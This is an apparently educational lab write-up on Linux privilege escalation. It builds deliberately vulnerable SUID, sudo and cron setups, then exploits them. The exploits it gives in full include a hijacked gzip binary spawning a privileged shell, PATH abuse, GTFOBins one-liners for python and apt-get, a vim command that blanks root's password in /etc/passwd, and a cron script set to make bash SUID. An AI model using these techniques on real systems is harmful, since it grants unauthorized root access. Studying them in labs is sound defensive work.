# Linux Privilege Escalation

## Path Abuse

### Case - 1: Path abuse + SUID Misconfiguration

<details>

<summary><strong>Creating Vulnerable Environment</strong> </summary>

### Step - 1: Create the vulnerable program (simulating bad admin/developer practice)&#x20;

{% code overflow="wrap" %}
```c
// /root/sysaudit.c
#include <stdio.h>
#include <unistd.h>

int main() {
    printf("[sysaudit] Initializing compliance check module...\n");
    printf("[sysaudit] Step 1/3: Validating environment\n");
    printf("[sysaudit] Step 2/3: Collecting system baseline\n");
    printf("[sysaudit] Step 3/3: Finalizing audit report\n");

    // Internally shells out to an archival utility to package audit logs —
    // resolved via PATH, not hardcoded
    execlp("gzip", "gzip", "-k", "/var/log/auth.log", (char *)NULL);

    // Should never reach here unless execlp fails
    return 1;
}
```
{% endcode %}

### Step - 2: Compile it and set the SUID bit&#x20;

{% code overflow="wrap" %}
```bash
gcc -o /usr/local/bin/sysaudit /root/sysaudit.c
chown root:root /usr/local/bin/sysaudit
chmod 4755 /usr/local/bin/sysaudit
```
{% endcode %}

#### Verify&#x20;

<figure><img src="../../.gitbook/assets/image (1820).png" alt=""><figcaption></figcaption></figure>

</details>

#### Step - 1: Search for files that have an SUID bit set

{% tabs %}
{% tab title="Find SUID binaries" %}
{% code overflow="wrap" %}
```bash
find / -perm -u=s -type f 2>/dev/null
```
{% endcode %}

<figure><img src="../../.gitbook/assets/2026-08-01_133701.png" alt=""><figcaption></figcaption></figure>
{% endtab %}

{% tab title="Find suspicious binary" %}
Using AI, we successfully identified a custom executable among the listed executables.

<figure><img src="../../.gitbook/assets/image (1821).png" alt=""><figcaption></figcaption></figure>
{% endtab %}
{% endtabs %}

#### Step - 2: Analyze the binary&#x20;

**Agenda:**&#x20;

* Identify the system executable that the custom binary is using.
* Determine whether it uses the full path (e.g., `/usr/bin/df`) or just the executable name (e.g., `df`).

{% tabs %}
{% tab title="Run executable" %}
<figure><img src="../../.gitbook/assets/image (1822).png" alt=""><figcaption></figcaption></figure>

We cannot guess from the output what it is using. But let's verify it other ways.&#x20;
{% endtab %}

{% tab title="Using strings" %}
<figure><img src="../../.gitbook/assets/image (1823).png" alt=""><figcaption></figcaption></figure>

We got some clue that it is using `gzip`&#x20;
{% endtab %}

{% tab title="Using ltrace" %}
<figure><img src="../../.gitbook/assets/image (1824).png" alt=""><figcaption></figcaption></figure>

We can conclude that it is using `gzip` and doing something with log files.&#x20;
{% endtab %}

{% tab title="Confirming Using pspy64" %}
**Running pspy64**

<figure><img src="../../.gitbook/assets/image (1813).png" alt=""><figcaption></figcaption></figure>

**Confirming it**&#x20;

<figure><img src="../../.gitbook/assets/image (1825).png" alt=""><figcaption></figcaption></figure>
{% endtab %}
{% endtabs %}

#### Step 3: Create a malicious executable in a writable directory&#x20;

{% code overflow="wrap" %}
```c
// /tmp/gzip.c
#include <stdio.h>
#include <unistd.h>

int main() {
    printf("[+] Malicious gzip executed — real uid=%d euid=%d\n", getuid(), geteuid());
    execl("/bin/bash", "bash", "-p", (char *)NULL);
    perror("execl failed");
    return 1;
}
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1826).png" alt=""><figcaption></figcaption></figure>

#### Step 4: Modify PATH Variable

{% code overflow="wrap" %}
```bash
export PATH=/tmp:$PATH
echo $PATH
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1816).png" alt=""><figcaption></figcaption></figure>

#### Step 5: Execute custom executable&#x20;

<figure><img src="../../.gitbook/assets/image (1827).png" alt=""><figcaption></figcaption></figure>

### Case - 2: Path Abuse + Sudo Misconfiguration&#x20;

**Scenario:** _After the previous vulnerability, the system administrator became more cautious and removed all the vulnerable SUID binaries. Instead, they consolidated all the required cleanup operations into a single shell script and granted users `sudo` access only to that script for cleaning the system. However, as attackers, we discovered that the `secure_path` option is disabled in this lab, allowing us to exploit the script through PATH abuse. Let's get started._

#### Check our Sudo privileges&#x20;

We're allowed to execute `update` and `clean` only through root permissions.&#x20;

<figure><img src="../../.gitbook/assets/image (1828).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
_Since full path of `apt` is required and provided we can't use path abuse for privesc._&#x20;
{% endhint %}

#### Understanding the sys-cleanup.sh

We're given `sudo` access to several commands. Additionally, the shell script uses command names without specifying their full paths. The administrator trusts us—but it's time to break that trust.

<figure><img src="../../.gitbook/assets/image (1829).png" alt=""><figcaption></figcaption></figure>

#### Writing malicious executable&#x20;

{% code overflow="wrap" %}
```bash
#!/bin/bash
echo "[+] Malicious apt executed — real uid=$(id -u) euid=$(id -u)"
/bin/bash -p
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1830).png" alt=""><figcaption></figcaption></figure>

#### Exporting path and escalating privileges&#x20;

{% code overflow="wrap" %}
```bash
export PATH=/tmp:$PATH
which find
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1832).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
_only disabled `secure-path` will allow us to escalate privileges using path abuse + Sudo misconfiguration._&#x20;
{% endhint %}

## Special Permissions&#x20;

The `Set User ID upon Execution` (`setuid`) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The `setuid` bit appears as an `s`

#### Find files with suid bit set&#x20;

<figure><img src="../../.gitbook/assets/image (1833).png" alt=""><figcaption></figcaption></figure>

#### Find executable in GTFOBins&#x20;

<figure><img src="../../.gitbook/assets/image (1836).png" alt=""><figcaption></figcaption></figure>

#### Escalate privileges&#x20;

{% code overflow="wrap" %}
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1835).png" alt=""><figcaption></figcaption></figure>

## Sudo Rights Abuse&#x20;

#### Check allowed root executables&#x20;

We're given permission to run `apt-get`, which means we can execute any `apt-get` command, such as `apt-get update`, `apt-get install`, and others. That's why it's important to grant only specific commands in the `sudoers` file, such as `apt-get update`, to ensure the user can execute only that particular command and nothing else.

<figure><img src="../../.gitbook/assets/image (1837).png" alt=""><figcaption></figcaption></figure>

#### Check GTFOBins&#x20;

<figure><img src="../../.gitbook/assets/image (1838).png" alt=""><figcaption></figcaption></figure>

#### Escalate privileges&#x20;

{% code overflow="wrap" %}
```bash
apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1839).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
_Note that if only `apt-get update` is specified in the `sudoers` file, we cannot append any additional arguments or commands after `apt-get update`. This restriction makes it much more difficult to escalate privileges._
{% endhint %}

## Exploiting Capabilities&#x20;

lab environment setup explained [here](../../prerequisites/os-essentials/linux-fundamentals/#set-capabilities)

#### Enumerating Capabilities&#x20;

{% code overflow="wrap" %}
```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1840).png" alt=""><figcaption></figcaption></figure>

We can see that `python3.14` has the capability to `setuid`.&#x20;

#### Identifying capabilities&#x20;

{% code overflow="wrap" %}
```bash
getcap <executable>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1841).png" alt=""><figcaption></figcaption></figure>

#### Exploiting Capabilities&#x20;

{% code overflow="wrap" %}
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1842).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><strong>Case 2</strong> </summary>

### Enumerate Capabilities&#x20;

{% code overflow="wrap" %}
```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1843).png" alt=""><figcaption></figcaption></figure>

**`CAP_DAC_OVERRIDE`**: Bypasses Linux file read, write, and execute permission checks (DAC).

### Checking all capabilities&#x20;

{% code overflow="wrap" %}
```bash
getcap /usr/bin/vim.basic
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1844).png" alt=""><figcaption></figcaption></figure>

### Exploiting Capabilities&#x20;

Since we're allowed to read and write any file with vim. let's try to change passwd file.&#x20;

{% code overflow="wrap" %}
```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1845).png" alt=""><figcaption></figcaption></figure>



</details>

## Cron Job Abuse&#x20;

<details>

<summary><strong>Create vulnerable environment</strong></summary>

{% code overflow="wrap" %}
```bash
#!/bin/bash

echo "Cleaning temporary files..."
rm -rf /tmp/*.tmp 2>/dev/null
```
{% endcode %}

{% code overflow="wrap" %}
```bash
mkdir -p /opt/scripts
chmod +x /opt/scripts/cleanup.sh
chown root:user3 /opt/scripts/cleanup.sh
ls -l /opt/scripts/cleanup.sh
cat /opt/scripts/cleanup.sh
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1846).png" alt=""><figcaption></figcaption></figure>

</details>

#### find cron jobs&#x20;

{% code overflow="wrap" %}
```bash
cat /etc/crontab
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1847).png" alt=""><figcaption></figcaption></figure>

#### check permissions&#x20;

{% code overflow="wrap" %}
```bash
ls -l /opt/scripts/cleanup.sh
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1848).png" alt=""><figcaption></figcaption></figure>

We can see that `user3` is group owner of the file and it has write permissions on it.&#x20;

#### Replace the script

Replace the script with:&#x20;

{% code overflow="wrap" %}
```bash
cat > /opt/scripts/cleanup.sh << EOF
#!/bin/bash

chmod u+s /bin/bash
EOF
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1849).png" alt=""><figcaption></figcaption></figure>

#### Exploit&#x20;

Wait until `bin/bash` get the suid bit set. then boom.&#x20;

<figure><img src="../../.gitbook/assets/image (1850).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Note**&#x20;

_Root cron jobs may be stored in the root user's personal crontab, which is not readable by low-privileged users. In such cases, tools like **pspy** can be used to identify scheduled tasks by observing processes executed by root._
{% endhint %}

## Using Automated tools

### Using <kbd>Linux-Exploit-Suggester.sh</kbd>

